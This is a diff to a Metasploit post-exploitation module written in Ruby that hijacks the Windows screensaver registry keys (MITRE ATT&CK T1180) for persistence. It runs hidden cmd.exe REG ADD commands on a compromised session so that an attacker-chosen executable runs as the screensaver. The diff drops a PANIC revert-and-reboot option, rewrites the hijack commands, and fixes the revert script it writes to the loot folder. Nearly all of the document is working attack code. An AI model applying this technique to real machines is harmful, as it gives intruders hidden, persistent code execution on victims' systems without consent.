@@ -27,7 +27,6 @@
 # Set absoluct path of PE or application to run         => set APPL_PATH C:\\Windows\\System32\\calc.exe
 # Set the absoluct path where to store logfiles (local) => set LOOT_FOLDER /root/.msf4/loot
 # LogOff current user to force registry refresh?        => set LOG_OFF true
-# Revert target registry settings to defaut and logoff? => set PANIC true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -135,7 +134,6 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('LOG_OFF', [ false, 'LogOff current user to force registry refresh?', false]),
-                                OptBool.new('PANIC', [ false, 'Revert target registry settings to defaut and logoff?', false]),
                                 OptString.new('LOOT_FOLDER', [ true, 'Set the absoluct path where to store logfiles (local)'])
                         ], self.class)
 
@@ -232,56 +230,19 @@ def run
 
 
     #
-    # panic revert funtion
-    #
-    if datastore['PANIC'] == true
-      print_good("Reverting target registry settings to default and logoff.")
-      Rex::sleep(1.0)
-      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1")
-      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0")
-      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d 180")
-      cmd_exec("REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d %windir%\\system32\\Mystify.scr")
-      Rex::sleep(0.6)
-      print_status("Registry values changed in #{sysnfo['Computer']}")
-      print_line("    ScreenSaveActive    : 1")
-      print_line("    ScreenSaverIsSecure : 0")
-      print_line("    ScreenSaveTimeOut   : 180")
-      print_line("    SCRNSAVE.EXE: C:\\windows\\system32\\Mystify.scr")
-      Rex::sleep(1.0)
-      cmd_exec("shutdown /r /t 0")
-      return nil
-    end
-
-
-    #
     # Store default reg values to build revert.rc later.
     #
     print_status("Store default registry values to build revert.rc script.")
     Rex::sleep(0.5)
     print_status("Retriving default SCRNSAVE.EXE registry value data.")
-    scrnsave_data << registry_getvaldata('HKCU\Control Panel\Desktop','SCRNSAVE.EXE')
+    scrnsave_data = registry_getvaldata('HKCU\Control Panel\Desktop','SCRNSAVE.EXE')
     Rex::sleep(1.0)
     print_status("Retriving default ScreenSaveTimeOut registry value data.")
-    scrnsave_timeout << registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveTimeOut')
+    scrnsave_timeout = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaveTimeOut')
     Rex::sleep(1.0)
     print_status("Retriving default ScreenSaverIsSecure registry value data.")
-    scrnsave_issecure << registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
+    scrnsave_issecure = registry_getvaldata('HKCU\Control Panel\Desktop','ScreenSaverIsSecure')
     Rex::sleep(1.0)
-
-
-    #
-    # make sure that default retrieve(s) are  not empty string(s)
-    # IF they are empty strings, then use my own default settings.
-    #
-    if scrnsave_data.nil?
-      scrnsave_data = "%windir%\\system32\\Mystify.scr" # default value (windows 10)
-    end
-    if scrnsave_timeout.nil?
-      scrnsave_timeout = "180" # 180 sec = 3 minuts
-    end
-    if scrnsave_issecure.nil?
-      scrnsave_issecure = "0" # 0 = scrnsave_is_secure off
-    end
 
 
       #
@@ -302,24 +263,25 @@ def run
         #
         # List of registry keys to add to target regedit .. 
         #
-        print_status("Hijacking #{sysnfo['Computer']} registry keys.")
+        print_status("Hijacking #{sysnfo['Computer']} remote registry keys.")
         Rex::sleep(1.0)
           hacks = [
-            "HKCU\\'Control Panel'\\Desktop /v ScreenSaveActive /t REG_SZ /d 1 /f",
-            "HKCU\\'Control Panel'\\Desktop /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
-            "HKCU\\'Control Panel'\\Desktop /v ScreenSaveTimeOut /t REG_SZ /d #{time_out} /f",
-            "HKCU\\'Control Panel'\\Desktop /v SCRNSAVE.EXE /t REG_SZ /d #{app_path} /f"
+            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f",
+            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",
+            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d #{time_out} /f",
+            "REG ADD \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d #{app_path} /f"
           ]
 
 
          #
          # LOOP funtion to add reg keys
          #
+         print_line("")
          session.response_timeout=120
          hacks.each do |cmd|
             begin
               # execute cmd prompt in a hidden channelized windows
-              r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+              r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
               print_line("    Hijack: #{cmd}")
  
                 # close client channel when done
@@ -333,6 +295,7 @@ def run
               print_error("Error Running Command: #{e.class} #{e}")
             end
          end
+         print_line("")
 
 
        #
@@ -343,15 +306,15 @@ def run
        Rex::sleep(1.0)
          loot_folder = datastore['LOOT_FOLDER'] # /root/.msf4/loot
          File.open("#{loot_folder}/revert_#{rand}.rc", "w") do |f|
-           f.write("###")
-           f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.")
-           f.write("## Computer: #{sysnfo['Computer']} | Payload: #{app_path}")
-           f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc")
-           f.write("###")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d 1")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}")
-           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}")
+           f.write("###\n")
+           f.write("## SCRNSAVE mitre ATT&CK T1180 - revert to default script.\n")
+           f.write("## Computer: #{sysnfo['Computer']} | Payload: #{app_path}\n")
+           f.write("## To revert hack execute in a meterpreter prompt: resource #{loot_folder}/revert_#{rand}.rc\n")
+           f.write("###\n")
+           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveActive -t REG_SZ -d 1\n")
+           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaverIsSecure -t REG_SZ -d #{scrnsave_issecure}\n")
+           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v ScreenSaveTimeOut -t REG_SZ -d #{scrnsave_timeout}\n")
+           f.write("reg setval -k \"HKCU\\Control Panel\\Desktop\" -v SCRNSAVE.EXE -t REG_SZ -d #{scrnsave_data}\n")
            f.close
          end
 
